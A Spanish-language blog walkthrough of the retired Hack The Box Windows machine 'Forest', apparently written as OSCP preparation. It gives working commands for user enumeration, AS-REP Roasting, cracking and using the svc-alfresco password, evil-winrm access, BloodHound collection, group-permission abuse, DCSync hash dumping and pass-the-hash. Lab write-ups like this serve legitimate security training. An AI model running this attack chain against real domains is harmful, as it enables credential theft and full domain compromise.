---
layout: single
title: Forest - Hack The Box
excerpt: "Una de las cosas interesantes de HTB es que expone conceptos de Windows a diferencia de cualquier CTF con el que me hubiera encontrado antes. Forest es un gran ejemplo de eso. Es un controlador de dominio que me permite enumerar usuarios a través de RPC, atacar Kerberos con AS-REP Roasting y usar Win-RM para obtener un shell. Entonces puedo aprovechar los permisos y accesos de ese usuario para obtener las capacidades de DCSycn, lo que me permite descargar hashes para el usuario administrador y obtener un shell como administrador. En Beyond Root, veré cómo se ve DCSync en el cable y veré la tarea automatizada de limpieza de permisos."
date: 2021-06-30
classes: wide
header:
  teaser: /assets/images/Forest/forest_hud42c7e9ba3326b41c7efd3293cf727ae_298854_1600x0_resize_box_2.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Active Directory
  - ASP-RESP Roasting
  - BloodHound
  - DCSync
  - OSCP
---

# Forest HTB

Hoy vamos a estar resolviendo la maquina Forest, una maquina Windows de dificultad fácil, es una de las maquinas retiradas de HackTheBox pero este mes de Julio estarán disponibles para hacer de forma gratuita.

Tambien es una de las maquinas que recomiendan de hacer para prepararte para el OSCP:

![/assets/images/Forest/Untitled.png](/assets/images/Forest/Untitled.png)

![/assets/images/Forest/forest_hud42c7e9ba3326b41c7efd3293cf727ae_298854_1600x0_resize_box_2.png](/assets/images/Forest/forest_hud42c7e9ba3326b41c7efd3293cf727ae_298854_1600x0_resize_box_2.png)

# **ENUMERACIÓN CON NMAP**

Lo primero de todo como siempre será enumerar que puertos tiene abiertos la maquina, para ellos vamos a utilizar la herramienta "nmap" con la que haremos un escaneo exhaustivo de puertos.

Para hacer un "Fast Scan" de puertos, siempre suelo utilizar esta sintaxis:

`nmap -sS —min-rate 5000 -p- —open -n -Pn -vvv <IPMACHINE> -oN <FILENAME>`

![/assets/images/Forest/Untitled%201.png](/assets/images/Forest/Untitled%201.png)

Ahora vamos a enumerar versiones y servicios de todos los puertos con Nmap:

`nmap -sC -sV -p<PUERTOS> <IPMACHINE> -oN <FILENAME>`

![/assets/images/Forest/Untitled%202.png](/assets/images/Forest/Untitled%202.png)

Vemos muchos puertos abiertos pero no temáis, mucho mejor tener puertos abiertos para poder escanearlos y ver si hay alguna missconfiguración de algún servicio que nos reporte información interesante. Este scan parece que estamos ante un DC (Domain Controller) asi que antes que nada como veo el puerto 53 abierto, que es un puerto de servicios DNS, voy a agregar al /etc/hosts la IP de la maquina y el dominio, voy a utilizar htb.local y forest.htb.local:

![/assets/images/Forest/Untitled%203.png](/assets/images/Forest/Untitled%203.png)

![/assets/images/Forest/Untitled%204.png](/assets/images/Forest/Untitled%204.png)

![/assets/images/Forest/Untitled%205.png](/assets/images/Forest/Untitled%205.png)

Pero no nos deja hacer una transferencia de zona.

# **ENUMERACIÓN DE SAMBA**

Vamos a  enumerar en el puerto 445 (SMB):

Con el uso de la herramienta smbclient y este comando podemos ver si hay algunos recursos compartidos:

`smbclient -L <IPMACHINE> -N`

-L = para listar el contenido

-N = para hacer uso de Null Session

![/assets/images/Forest/Untitled%206.png](/assets/images/Forest/Untitled%206.png)

# **ENUMERACIÓN DE RCP**

Pero no vemos nada interesante, vamos a seguir enumerando, podemos intentar conseguir nombres de usuarios mediante RPC. En este caso voy a estar utilizando la herramienta "rpcenum" de S4vitaar.

![/assets/images/Forest/Untitled%207.png](/assets/images/Forest/Untitled%207.png)

Hacemos una lista con los usuarios potenciales:

![/assets/images/Forest/Untitled%208.png](/assets/images/Forest/Untitled%208.png)

# **ATAQUE AS-REP ROASTING**

Vamos a intentar realizar un ataque AS-REP Roasting:

AS-REP Roasting es un ataque contra Kerberos para cuentas de usuario que no requieren autenticación previa (UF_DONT_REQUIRE_PREAUTH esta activado)

Con la herramienta GetNPUsers.py vamos a intentar encontrar un usuario con dicha cualidad:

Creamos un bucle para ir iterando en cada usuario:

`for user in $(cat users); do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`

![/assets/images/Forest/Untitled%209.png](/assets/images/Forest/Untitled%209.png)

Obtenemos el hash del usuario svc-alfresco, vamos a crackearlo con john:

![/assets/images/Forest/Untitled%2010.png](/assets/images/Forest/Untitled%2010.png)

# **EVIL-WINRM PARA GANAR ACCESO**

La contraseña es s3rvice, vamos a usarla para conectarnos con WinRM, para usar esta herramienta tiene que tener abierto el puerto 5985 de la maquina HTTP o 5986 HTTPS:

Para instalar esta herramienta: `gem install evil-winrm`

`evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`

Y hemos obtenido una PowerShell:

![/assets/images/Forest/Untitled%2011.png](/assets/images/Forest/Untitled%2011.png)

Podemos ver la flag:

![/assets/images/Forest/Untitled%2012.png](/assets/images/Forest/Untitled%2012.png)

# **PRIV. ESCALATION**

Vamos a enumerar el sistema con PowerUp.ps1 y SharpHound.ps1

Nos compartimos un servidor HTTP con python:

`python3 -m http.server 80`

Y en la maquina nos descargamos los dos archivos en un directorio en el que tengamos permisos:

![/assets/images/Forest/Untitled%2013.png](/assets/images/Forest/Untitled%2013.png)

![/assets/images/Forest/Untitled%2014.png](/assets/images/Forest/Untitled%2014.png)

Ejecutamos primero:

`Invoke-AllChecks | Out-File -Encoding ASCI checks.txt` 

![/assets/images/Forest/Untitled%2015.png](/assets/images/Forest/Untitled%2015.png)

Pero no nos muestra nada interesante, el Path-Hijacking que nos muestra es un bug de la herramienta que no vamos a poder utilizar, asi que vamos a enumera con BloodHound, pero primero ejecutaremos el siguiente comando para que nos haga una enumeracion de todo el sistema y nos lo aguarde en un .zip:

# **USO E INSTALACION DE BLOODHOUND**

`invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice`

Esto nos creara un archivo .zip que debemos importar al BloodHound:

![/assets/images/Forest/Untitled%2016.png](/assets/images/Forest/Untitled%2016.png)

Nos compartimos por medio de samba (smbserver.py) nuestra carpeta con el siguiente comando: 

`python3 smbserver.py share . -smb2support -username pwned -password password123`

![/assets/images/Forest/Untitled%2017.png](/assets/images/Forest/Untitled%2017.png)

![/assets/images/Forest/Untitled%2018.png](/assets/images/Forest/Untitled%2018.png)

Nos hemos conectado y estamos compartiendo esa carpeta para ahora pasarnos el .zip creado con SharpHound:

`copy <NOMBREDELZIP> \\<IP>\<DIRNAME>`

![/assets/images/Forest/Untitled%2019.png](/assets/images/Forest/Untitled%2019.png)

Ahora tendremos que tener instalado el BloodHound en nuestra maquina, para ello hacemos:

`apt-get install neo4j`

Una vez se descargue:

`neo4j console`

Cuando se inicie  abrimos el navegador y vamos a :

http://localhost:7474

Ponemos el usuario por defecto: u:neo4j p:neo4j

Instalamos el BloodHound:

`apt-get install BloodHound`

Y lo iniciamos : `bloodhound`

Una vez dentro importamos el .zip: Upload data y seleccionamos el .zip, vamos a analysis y clicamos en "find Shorter Paths to Domain Admins":

![/assets/images/Forest/Untitled%2020.png](/assets/images/Forest/Untitled%2020.png)

Seguimos la ruta que nos marca el BloodHound:

![/assets/images/Forest/Untitled%2021.png](/assets/images/Forest/Untitled%2021.png)

Cross Domain Attacks – MS Exchange -Organization Management

El usuario svc-alfresco es miembro de ACCOUNT OPERATOR y este grupo tiene permisos de GenericAll en el grupo EXCHANGE WINDOWS PERMISIONS, hacemos click drecho en GenericAll y le damos a help, luego AbuseInfo y nos dira de que forma podemos aprovecharnos de esto:

![/assets/images/Forest/Untitled%2022.png](/assets/images/Forest/Untitled%2022.png)

![/assets/images/Forest/Untitled%2023.png](/assets/images/Forest/Untitled%2023.png)

![/assets/images/Forest/Untitled%2024.png](/assets/images/Forest/Untitled%2024.png)

# **EXPLOTACION PARA ESCALAR PRIVILEGIOS**

Podemos crear un usuario y meterlo en dichos grupos:

![/assets/images/Forest/Untitled%2025.png](/assets/images/Forest/Untitled%2025.png)

Lo metemos en el grupo con el comando:

`net group "exchange windows permissions" /add <USER>`

![/assets/images/Forest/Untitled%2026.png](/assets/images/Forest/Untitled%2026.png)

Pasamos a la maquina el Script PowerView.ps1, nos compartimos un servidor con python y lo pasamos:

Damos los permisos al usuario creado para realizar el ataque DCSync:

![/assets/images/Forest/Untitled%2027.png](/assets/images/Forest/Untitled%2027.png)

Ejecutamos el ataque con la herramienta impacket-secretsdump y nos dara todos los hashes:

![/assets/images/Forest/Untitled%2028.png](/assets/images/Forest/Untitled%2028.png)

Ahora podemos realizar un Pass-The-Hash con la herramienta impacket-psexec, lo que nos permite conectarnos a la maquina con cualquier usuario sin necesidad de saber sus credenciales, solo con el hash:

![/assets/images/Forest/Untitled%2029.png](/assets/images/Forest/Untitled%2029.png)

![/assets/images/Forest/Untitled%2030.png](/assets/images/Forest/Untitled%2030.png)

![/assets/images/Forest/Untitled%2031.png](/assets/images/Forest/Untitled%2031.png)

Espero que os haya gustado la maquina tanto como a mi, para ser una maquina de dificultad fácil se me a asemejado mucho a nivel medium, pero me ha gustado mucho.
